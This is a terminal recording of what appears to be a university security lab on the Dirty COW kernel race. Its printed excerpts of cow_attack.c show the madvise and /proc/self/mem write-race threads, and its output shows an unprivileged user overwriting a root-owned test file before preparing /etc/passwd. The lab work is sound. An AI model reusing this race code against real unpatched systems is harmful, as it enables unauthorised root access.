@@ -1,0 +1,458 @@
+Script started on Fri 09 Oct 2026 12:48:06 PM PDT
+[10/09/2026 12:48] seed@ubuntu:~$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 12:48] seed@ubuntu:~$ xrandr
+Screen 0: minimum 1 x 1, current 800 x 600, maximum 8192 x 8192
+Virtual1 connected 800x600+0+0 (normal left inverted right x axis y axis) 0mm x 0mm
+   800x600        60.0*+   60.3  
+   2560x1600      60.0  
+   1920x1440      60.0  
+   1856x1392      60.0  
+   1792x1344      60.0  
+   1920x1200      59.9  
+   1600x1200      60.0  
+   1680x1050      60.0  
+   1400x1050      60.0  
+   1280x1024      60.0  
+   1440x900       59.9  
+   1280x960       60.0  
+   1360x768       60.0  
+   1280x800       59.8  
+   1152x864       75.0  
+   1280x768       59.9  
+   1024x768       60.0  
+   640x480        59.9  
+Virtual2 disconnected (normal left inverted right x axis y axis)
+Virtual3 disconnected (normal left inverted right x axis y axis)
+Virtual4 disconnected (normal left inverted right x axis y axis)
+Virtual5 disconnected (normal left inverted right x axis y axis)
+Virtual6 disconnected (normal left inverted right x axis y axis)
+Virtual7 disconnected (normal left inverted right x axis y axis)
+Virtual8 disconnected (normal left inverted right x axis y axis)
+[10/09/2026 12:48] seed@ubuntu:~$ xrandr -s 1280x960
+[10/09/2026 12:49] seed@ubuntu:~$ command -v wmctrl xdotool
+[10/09/2026 12:50] seed@ubuntu:~$ python -c 'import gtk; r=gtk.gdk.get_de fault_root_window(); w=r.property_get("_NET_ACTIVE_WINDOW")[2][0]; gtk.gd k.window_foreign_new(w).maximize(); gtk.gdk.display_get_default().warp_po inter(gtk.gdk.screen_get_default(),1250,930); gtk.gdk.flush()'
+[10/09/2026 12:51] seed@ubuntu:~$ [K[10/09/2026 12:51] seed@ubuntu:~$ clear
+[H[2J[10/09/2026 12:52] seed@ubuntu:~$ whoami
+seed
+[10/09/2026 12:52] seed@ubuntu:~$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 12:52] seed@ubuntu:~$ lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 12.04.2 LTS
+Release:	12.04
+Codename:	precise
+[10/09/2026 12:52] seed@ubuntu:~$ uname -r
+3.5.0-37-generic
+[10/09/2026 12:52] seed@ubuntu:~$ uname -m
+i686
+[10/09/2026 12:52] seed@ubuntu:~$ getconf LONG_BIT
+32
+[10/09/2026 12:52] seed@ubuntu:~$ dpkg-query -W "linux-image-$(uname -r)"
+linux-image-3.5.0-37-generic	3.5.0-37.58~precise1
+[10/09/2026 12:52] seed@ubuntu:~$ gcc --version
+gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
+Copyright (C) 2011 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+[10/09/2026 12:52] seed@ubuntu:~$ clear
+[H[2J[10/09/2026 12:53] seed@ubuntu:~$ command -v gcc bash timeout unzip wget nano python script sha256sum pgrep
+/usr/bin/gcc
+/bin/bash
+/usr/bin/timeout
+/usr/bin/unzip
+/usr/bin/wget
+/usr/bin/nano
+/usr/bin/python
+/usr/bin/script
+/usr/bin/sha256sum
+/usr/bin/pgrep
+[10/09/2026 12:53] seed@ubuntu:~$ dpkg-query -W -f='${Architecture} ${Source}\n' "linux-image-$(uname -r)"
+i386 linux-lts-quantal
+[10/09/2026 12:53] seed@ubuntu:~$ cat /sys/class/dmi/id/product_name
+VirtualBox
+[10/09/2026 12:53] seed@ubuntu:~$ date -u
+Fri Oct  9 19:53:15 UTC 2026
+[10/09/2026 12:53] seed@ubuntu:~$ cd ~/issd-member6/lab-files
+[10/09/2026 12:53] seed@ubuntu:~/issd-member6/lab-files$ pwd
+/home/seed/issd-member6/lab-files
+[10/09/2026 12:53] seed@ubuntu:~/issd-member6/lab-files$ df -T .
+Filesystem     Type 1K-blocks    Used Available Use% Mounted on
+/dev/sda1      ext4  80505672 4167360  72248868   6% /
+[10/09/2026 12:53] seed@ubuntu:~/issd-member6/lab-files$ mountpoint ~/m6-transfer
+/home/seed/m6-transfer is not a mountpoint
+[10/09/2026 12:53] seed@ubuntu:~/issd-member6/lab-files$ mountpoint ~/m6-export
+/home/seed/m6-export is not a mountpoint
+[10/09/2026 12:53] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ ls -ld . ../evidence/logs ../provenance
+drwx------ 3 seed seed 4096 Oct  7 12:37 [0m[01;34m.[0m
+drwx------ 2 seed seed 4096 Oct  7 12:37 [01;34m../evidence/logs[0m
+drwx------ 2 seed seed 4096 Oct  7 12:37 [01;34m../provenance[0m
+[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ ls -l cow_attack cow_control
+-rwxr-xr-x 1 seed seed 12540 Oct  7 12:37 [0m[01;32mcow_attack[0m
+-rwxr-xr-x 1 seed seed  7601 Oct  7 12:37 [01;32mcow_control[0m
+[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ pgrep -x cow_attack
+[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ pgrep -x su
+[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ sha256sum -c SOURCE_SHA256SUMS
+build.sh: OK
+cow_attack.c: OK
+cow_control.c: OK
+run_trial.sh: OK
+[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ sha256sum build.sh cow_attack.c cow_control.c run_trial.sh
+d2a0b9a5dd0b0a284e0fbbef46295be5cd9f3982f79c494b0db076f5cd7c6bcb  build.sh
+77fc34c697f0217b1fcd29bfe7cba4e53ea92a3dc41e72dde5ae02ec23e756b4  cow_attack.c
+32a85207d427bf3ae706e8cf2987febb2b5542b0e4a57ae4cd805dd94804e20f  cow_control.c
+73a1885c95d5e21ececfea7bf8bd264946f86fc0e413d3667b0bd91094999478  run_trial.sh
+[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ file build.sh cow_attack.c cow_control.c run_trial.sh
+build.sh:      a bash script, ASCII text executable
+cow_attack.c:  ASCII C program text
+cow_control.c: ASCII English text
+run_trial.sh:  a bash script, ASCII text executable
+[10/09/2026 12:54] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 12:55] seed@ubuntu:~/issd-member6/lab-files$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 12:55] seed@ubuntu:~/issd-member6/lab-files$ pwd
+/home/seed/issd-member6/lab-files
+[10/09/2026 12:55] seed@ubuntu:~/issd-member6/lab-files$ sha256sum -c SOURCE_SHA256SUMS
+build.sh: OK
+cow_attack.c: OK
+cow_control.c: OK
+run_trial.sh: OK
+[10/09/2026 12:55] seed@ubuntu:~/issd-member6/lab-files$ ls -l *.c *.sh
+-rw-r--r-- 1 seed seed  458 Oct  7 12:23 build.sh
+-rw-r--r-- 1 seed seed 5150 Oct  7 12:23 cow_attack.c
+-rw-r--r-- 1 seed seed 1378 Oct  7 12:23 cow_control.c
+-rw-r--r-- 1 seed seed 3022 Oct  7 12:23 run_trial.sh
+[10/09/2026 12:55] seed@ubuntu:~/issd-member6/lab-files$ bash build.sh
+-rwxr-xr-x 1 seed seed 12540 Oct  9 12:55 cow_attack
+-rwxr-xr-x 1 seed seed  7601 Oct  9 12:55 cow_control
+No Set-UID installation is used for Dirty COW.
+[10/09/2026 12:55] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 12:55] seed@ubuntu:~/issd-member6/lab-files$ file cow_attack cow_control
+cow_attack:  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xcedb25e9c2441e6e43f80bb134959432696a6283, not stripped
+cow_control: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb67a3bc84e2c6c9fe46f963747af0e6cde85da2d, not stripped
+[10/09/2026 12:55] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 12:56] seed@ubuntu:~/issd-member6/lab-files$ nl -ba cow_attack.c | sed -n '100,114p'
+   100	    int fd = open(path, O_RDONLY);
+   101	    if (fd == -1)
+   102	        fail("open target O_RDONLY");
+   103	    if (fstat(fd, &st) == -1)
+   104	        fail("fstat");
+   105	    if (!S_ISREG(st.st_mode) || st.st_uid != 0 || st.st_size <= 0 ||
+   106	        st.st_size > 1024 * 1024 || access(path, W_OK) == 0) {
+   107	        fprintf(stderr, "Target must be small, root-owned, regular and not writable by caller.\n");
+   108	        return 1;
+   109	    }
+   110	    mapping_size = (size_t)st.st_size;
+   111	    mapping = mmap(NULL, mapping_size, PROT_READ, MAP_PRIVATE, fd, 0);
+   112	    if (mapping == MAP_FAILED)
+   113	        fail("mmap");
+   114	    close(fd);
+[10/09/2026 12:56] seed@ubuntu:~/issd-member6/lab-files$ nl -ba cow_attack.c | sed -n '130,151p'
+   130	    replacement_size = strlen(replacement);
+   131	    memory_address = (off_t)(uintptr_t)(position + field_offset);
+   132	    printf("RUID=%lu EUID=%lu target=%s file-byte-offset=%lu length=%lu\n",
+   133	           (unsigned long)getuid(), (unsigned long)geteuid(), path,
+   134	           (unsigned long)(start + field_offset), (unsigned long)replacement_size);
+   135	    puts("O_RDONLY + PROT_READ + MAP_PRIVATE; racing memory writes and MADV_DONTNEED.");
+   136	    puts("Run bounded trials with run_trial.sh; Ctrl+C stops a direct run.");
+   137	    fflush(stdout);
+   138	
+   139	    int error = pthread_create(&discard, NULL, discard_thread, NULL);
+   140	    if (error != 0) {
+   141	        errno = error;
+   142	        fail("pthread_create discard");
+   143	    }
+   144	    error = pthread_create(&writer, NULL, write_thread, NULL);
+   145	    if (error != 0) {
+   146	        errno = error;
+   147	        fail("pthread_create writer");
+   148	    }
+   149	    pthread_join(discard, NULL);
+   150	    pthread_join(writer, NULL);
+   151	    return 0;
+[10/09/2026 12:56] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 12:56] seed@ubuntu:~/issd-member6/lab-files$ nl -ba cow_attack.c | sed -n '31,61p'
+    31	static void *discard_thread(void *unused)
+    32	{
+    33	    (void)unused;
+    34	    for (;;) {
+    35	        if (madvise(mapping, mapping_size, MADV_DONTNEED) != 0)
+    36	            fail("madvise");
+    37	    }
+    38	    return NULL;
+    39	}
+    40	
+    41	static void *write_thread(void *unused)
+    42	{
+    43	    (void)unused;
+    44	    int fd = open("/proc/self/mem", O_RDWR);
+    45	    if (fd == -1)
+    46	        fail("open /proc/self/mem");
+    47	    for (;;) {
+    48	        /* This offset is a VIRTUAL ADDRESS, not an offset into /etc/passwd.
+    49	         * pwrite combines the upstream lseek + write on this private fd. */
+    50	        ssize_t count = pwrite(fd, replacement, replacement_size, memory_address);
+    51	        if (count == -1 && errno == EINTR)
+    52	            continue;
+    53	        if (count == -1)
+    54	            fail("pwrite /proc/self/mem");
+    55	        if ((size_t)count != replacement_size) {
+    56	            fprintf(stderr, "Short memory write; inspect the target before retrying.\n");
+    57	            exit(EXIT_FAILURE);
+    58	        }
+    59	    }
+    60	    return NULL;
+    61	}
+[10/09/2026 12:56] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 12:57] seed@ubuntu:~/issd-member6/lab-files$ source ../automation/guest-guard.sh && m6_require_guest && m6_re quire_workspace
+[10/09/2026 12:57] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 12:57] seed@ubuntu:~/issd-member6/lab-files$ python --version
+Python 2.7.3
+[10/09/2026 12:57] seed@ubuntu:~/issd-member6/lab-files$ python -c 'compile(open("../automation/verify-trial.py").read(),  "verify-trial.py", "exec")'
+[10/09/2026 12:57] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 12:57] seed@ubuntu:~/issd-member6/lab-files$ timeout --signal=TERM --kill-after=2s 1s /bin/sleep 2
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+124
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ ls -l /zzz
+ls: cannot access /zzz: No such file or directory
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ getent passwd charlie
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+2
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ grep '^charlie:' /etc/passwd
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+1
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ ls -l logs ../provenance
+logs:
+total 0
+
+../provenance:
+total 4
+-rw-rw-r-- 1 seed seed 155 Oct  7 12:37 build-initial-binaries.sha256
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ sudo -n true
+sudo: sorry, a password is required to run sudo
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+1
+[10/09/2026 12:58] seed@ubuntu:~/issd-member6/lab-files$ ps -p $$,$PPID -o pid,ppid,comm
+  PID  PPID COMMAND
+ 2752  2751 script
+ 2753  2752 bash
+[10/09/2026 13:00] seed@ubuntu:~/issd-member6/lab-files$ ls -lh ~/m6-fresh-20261009-1946.typescript
+-rw-rw-r-- 1 seed seed 13K Oct  9 13:00 /home/seed/m6-fresh-20261009-1946.typescript
+[10/09/2026 13:00] seed@ubuntu:~/issd-member6/lab-files$ sudo -v
+[sudo] password for seed: 
+[10/09/2026 13:07] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 13:15] seed@ubuntu:~/issd-member6/lab-files$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 13:15] seed@ubuntu:~/issd-member6/lab-files$ mountpoint -q ~/m6-transfer || sudo -n mount -t vboxsf -o ro M6p ack ~/m6-transfer
+[10/09/2026 13:15] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:16] seed@ubuntu:~/issd-member6/lab-files$ mountpoint -q ~/m6-export || sudo -n mount -t vboxsf -o uid=$(id  -u),gid=$(id -g) M6export ~/m6-export
+[10/09/2026 13:16] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:16] seed@ubuntu:~/issd-member6/lab-files$ grep vboxsf /proc/mounts
+none /home/seed/m6-transfer [01;31m[Kvboxsf[m[K ro,nodev,relatime 0 0
+none /home/seed/m6-export [01;31m[Kvboxsf[m[K rw,nodev,relatime 0 0
+[10/09/2026 13:16] seed@ubuntu:~/issd-member6/lab-files$ ls -ld ~/m6-transfer ~/m6-export
+drwxr-xr-x 1 seed seed 4096 Oct  8 10:56 [0m[01;34m/home/seed/m6-export[0m
+drwxr-xr-x 1 root root 4096 Oct  8 10:58 [01;34m/home/seed/m6-transfer[0m
+[10/09/2026 13:16] seed@ubuntu:~/issd-member6/lab-files$ m6_require_guest && m6_require_workspace && m6_no_attacker && su do -n sh -c 'test ! -e /zzz && test ! -L /zzz && printf "111111222222333333\n" > /zzz && chown root:root /zzz && chmod 06 44 /zzz'
+No matching process: cow_attack
+No supplied trial wrapper is running.
+[10/09/2026 13:19] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:19] seed@ubuntu:~/issd-member6/lab-files$ ls -l /zzz
+-rw-r--r-- 1 root root 19 Oct  9 13:19 /zzz
+[10/09/2026 13:20] seed@ubuntu:~/issd-member6/lab-files$ cat /zzz
+111111222222333333
+[10/09/2026 13:20] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ cat /zzz
+111111222222333333
+[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ ls -l /zzz
+-rw-r--r-- 1 root root 19 Oct  9 13:19 /zzz
+[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ sha256sum /zzz
+7342e673ad4f9a5ea02fe84fa6ab1760d922e3f362c885ef4feda980423b9552  /zzz
+[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ echo 99999 > /zzz
+bash: /zzz: Permission denied
+[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+1
+[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ cat /zzz
+111111222222333333
+[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ sha256sum /zzz
+7342e673ad4f9a5ea02fe84fa6ab1760d922e3f362c885ef4feda980423b9552  /zzz
+[10/09/2026 13:25] seed@ubuntu:~/issd-member6/lab-files$ (set -C; sha256sum /zzz > ../provenance/dummy-normal.sha256)
+[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ cp -n /zzz ../provenance/dummy-normal.txt
+[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ ./cow_control | tee logs/fresh-control-01.txt
+Private memory: 111111******333333
+
+Backing file:   111111222222333333
+
+[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ cat /zzz
+111111222222333333
+[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ sha256sum -c ../provenance/dummy-normal.sha256
+/zzz: OK
+[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ cmp /zzz ../provenance/dummy-normal.txt
+[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ ls -l /zzz
+-rw-r--r-- 1 root root 19 Oct  9 13:19 /zzz
+[10/09/2026 13:26] seed@ubuntu:~/issd-member6/lab-files$ m6_require_guest && m6_require_workspace && m6_no_attacker
+No matching process: cow_attack
+No supplied trial wrapper is running.
+[10/09/2026 13:28] seed@ubuntu:~/issd-member6/lab-files$ sha256sum -c ../provenance/dummy-normal.sha256
+/zzz: OK
+[10/09/2026 13:28] seed@ubuntu:~/issd-member6/lab-files$ (set -C; stat -c '%u:%g:%a:%s' /zzz > logs/fresh-t1-01-metadata- before.txt)
+[10/09/2026 13:28] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 13:28] seed@ubuntu:~/issd-member6/lab-files$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 13:28] seed@ubuntu:~/issd-member6/lab-files$ bash run_trial.sh dummy 30 fresh-t1-01
+Date: 2026-10-09T13:28:48-0700
+Kernel: 3.5.0-37-generic
+Identity: uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+Target: /zzz
+Limit: 30s
+Before: 7342e673ad4f9a5ea02fe84fa6ab1760d922e3f362c885ef4feda980423b9552  /zzz
+Elapsed: 0s
+Change detected: yes
+After: 97c0ed6bb0deb556349015713d1c0a86d11e1bf5572a78b087650e814479b47b  /zzz
+Stopped after content change; inspect the full diff and verify exact outcome.
+RUID=1000 EUID=1000 target=/zzz file-byte-offset=6 length=6
+O_RDONLY + PROT_READ + MAP_PRIVATE; racing memory writes and MADV_DONTNEED.
+Run bounded trials with run_trial.sh; Ctrl+C stops a direct run.
+--- logs/fresh-t1-01-before.txt	2026-10-09 13:28:48.190096005 -0700
++++ logs/fresh-t1-01-after.txt	2026-10-09 13:28:48.414208000 -0700
+@@ -1 +1 @@
+-111111222222333333
++111111******333333
+A content change alone is not proof of UID 0; follow the guide verification steps.
+[10/09/2026 13:28] seed@ubuntu:~/issd-member6/lab-files$ (set -C; stat -c '%u:%g:%a:%s' /zzz > logs/fresh-t1-01-metadata- after.txt)
+[10/09/2026 13:30] seed@ubuntu:~/issd-member6/lab-files$ (set -C; python ../automation/verify-trial.py dummy logs/fresh-t 1-01 --live > logs/fresh-t1-01-verification.log 2>&1)
+[10/09/2026 13:30] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:30] seed@ubuntu:~/issd-member6/lab-files$ mountpoint -q ~/m6-export && cp -n logs/fresh-t1-01* logs/fresh- control-01.txt ~/m6-export/opus-fresh-20261008/logs/
+[10/09/2026 13:30] seed@ubuntu:~/issd-member6/lab-files$ mountpoint -q ~/m6-export && cp -n ../provenance/dummy-normal.*  ~/m6-export/opus-fresh-20261008/provenance/
+[10/09/2026 13:30] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ pgrep -x cow_attack
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ diff -u logs/fresh-t1-01-before.txt logs/fresh-t1-01-after.txt
+--- logs/fresh-t1-01-before.txt	2026-10-09 13:28:48.190096005 -0700
++++ logs/fresh-t1-01-after.txt	2026-10-09 13:28:48.414208000 -0700
+@@ -1 +1 @@
+-111111222222333333
++111111******333333
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ cat /zzz
+111111******333333
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ ls -l /zzz
+-rw-r--r-- 1 root root 19 Oct  9 13:19 /zzz
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ stat -c '%u:%g:%a:%s' /zzz
+0:0:644:19
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ sha256sum /zzz
+97c0ed6bb0deb556349015713d1c0a86d11e1bf5572a78b087650e814479b47b  /zzz
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ cmp /zzz <(printf '111111******333333\n')
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ grep '^Elapsed:' logs/fresh-t1-01-summary.txt
+[01;31m[KElapsed:[m[K 0s
+[10/09/2026 13:31] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 13:33] seed@ubuntu:~/issd-member6/lab-files$ getent passwd charlie
+[10/09/2026 13:33] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+2
+[10/09/2026 13:33] seed@ubuntu:~/issd-member6/lab-files$ m6_require_guest && m6_no_attacker && sudo -n adduser charlie
+No matching process: cow_attack
+No supplied trial wrapper is running.
+Adding user `charlie' ...
+Adding new group `charlie' (1002) ...
+Adding new user `charlie' (1001) with group `charlie' ...
+Creating home directory `/home/charlie' ...
+Copying files from `/etc/skel' ...
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+Changing the user information for charlie
+Enter the new value, or press ENTER for the default
+	Full Name []: 
+	Room Number []: 
+	Work Phone []: 
+	Home Phone []: 
+	Other []: 
+Is the information correct? [Y/n] y
+[10/09/2026 13:45] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 13:45] seed@ubuntu:~/issd-member6/lab-files$ grep '^charlie:' /etc/passwd
+[01;31m[Kcharlie:[m[Kx:1001:1002:,,,:/home/charlie:/bin/bash
+[10/09/2026 13:46] seed@ubuntu:~/issd-member6/lab-files$ id charlie
+uid=1001(charlie) gid=1002(charlie) groups=1002(charlie)
+[10/09/2026 13:46] seed@ubuntu:~/issd-member6/lab-files$ su - charlie
+Password: 
+]0;charlie@ubuntu: ~charlie@ubuntu:~$ id
+uid=1001(charlie) gid=1002(charlie) groups=1002(charlie)
+]0;charlie@ubuntu: ~charlie@ubuntu:~$ id -u
+1001
+]0;charlie@ubuntu: ~charlie@ubuntu:~$ whoami
+charlie
+]0;charlie@ubuntu: ~charlie@ubuntu:~$ exit
+logout
+[10/09/2026 13:47] seed@ubuntu:~/issd-member6/lab-files$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 13:47] seed@ubuntu:~/issd-member6/lab-files$ sudo -n -v
+sudo: sorry, a password is required to run sudo
+[10/09/2026 13:50] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+1
+[10/09/2026 13:50] seed@ubuntu:~/issd-member6/lab-files$ (set -eC; sha256sum /etc/passwd > ../provenance/passwd-normal.sh a256; grep '^charlie:' /etc/passwd > ../provenance/charlie-normal.txt; awk -F: '$3 == 0 {print $1 ":" $3}' /etc/passwd >  ../provenance/uid0-normal.txt)
+[10/09/2026 13:51] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:51] seed@ubuntu:~/issd-member6/lab-files$ mountpoint -q ~/m6-export && cp -n ../provenance/passwd-normal.s ha256 ../provenance/charlie-normal.txt ../provenance/uid0-normal.txt ~/m6-export/opus-fresh-20261008/provenance/
+[10/09/2026 13:52] seed@ubuntu:~/issd-member6/lab-files$ sudo -v
+[sudo] password for seed: 
+[10/09/2026 13:53] seed@ubuntu:~/issd-member6/lab-files$ m6_require_guest && m6_no_attacker && m6_no_process su && sudo - n sh -c 'test ! -e /root/issd-member6-passwd.normal && test ! -L /root/issd-member6-passwd.normal && cp -an /etc/passwd / root/issd-member6-passwd.normal'
+No matching process: cow_attack
+No supplied trial wrapper is running.
+No matching process: su
+[10/09/2026 13:55] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:55] seed@ubuntu:~/issd-member6/lab-files$ sudo -n cmp /etc/passwd /root/issd-member6-passwd.normal
+[10/09/2026 13:55] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:55] seed@ubuntu:~/issd-member6/lab-files$ clear
+[H[2J[10/09/2026 13:56] seed@ubuntu:~/issd-member6/lab-files$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark)
+[10/09/2026 13:56] seed@ubuntu:~/issd-member6/lab-files$ grep '^charlie:' /etc/passwd
+[01;31m[Kcharlie:[m[Kx:1001:1002:,,,:/home/charlie:/bin/bash
+[10/09/2026 13:56] seed@ubuntu:~/issd-member6/lab-files$ sudo -n ls -l /root/issd-member6-passwd.normal
+-rw-r--r-- 1 root root 2040 Oct  9 13:45 /root/issd-member6-passwd.normal
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ sudo -n cmp /etc/passwd /root/issd-member6-passwd.normal
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ echo $?
+0
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ sha256sum /etc/passwd
+3edf14347c28c11d3a8816326e14baa3b99b569f1dc33dd15cd7d953c91dc337  /etc/passwd
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ sha256sum -c ../provenance/passwd-normal.sha256
+/etc/passwd: OK
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ ls -l /etc/passwd
+-rw-r--r-- 1 root root 2040 Oct  9 13:45 /etc/passwd
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ test -w /etc/passwd || echo 'seed cannot write /etc/passwd'
+seed cannot write /etc/passwd
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ pgrep -x cow_attack
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ pgrep -x su
+[10/09/2026 13:57] seed@ubuntu:~/issd-member6/lab-files$ m6_no_attacker && cmp /zzz <(printf '111111******333333\n') && s udo -n sh -c 'printf "111111222222333333\n" > /zzz'
+No matching process: cow_attack
+No supplied trial wrapper is running.
+[10/09/2026 13:58] seed@ubuntu:~/issd-member6/lab-files$ sha256sum -c ../provenance/dummy-normal.sha256
+/zzz: OK
+[10/09/2026 13:58] seed@ubuntu:~/issd-member6/lab-files$ id charlie
+uid=1001(charlie) gid=1002(charlie) groups=1002(charlie)
+[10/09/2026 13:58] seed@ubuntu:~/issd-member6/lab-files$ pgrep -x su
+[10/09/2026 13:58] seed@ubuntu:~/issd-member6/lab-files$ dbus-send --system --print-reply --dest=org.freedesktop.ConsoleK it /org/freedesktop/ConsoleKit/Manager org.freedesktop.ConsoleKit.Manager.CanStop
+method return sender=:1.15 -> dest=:1.67 reply_serial=2
+   boolean true
+[10/09/2026 13:59] seed@ubuntu:~/issd-member6/lab-files$ exit
+exit
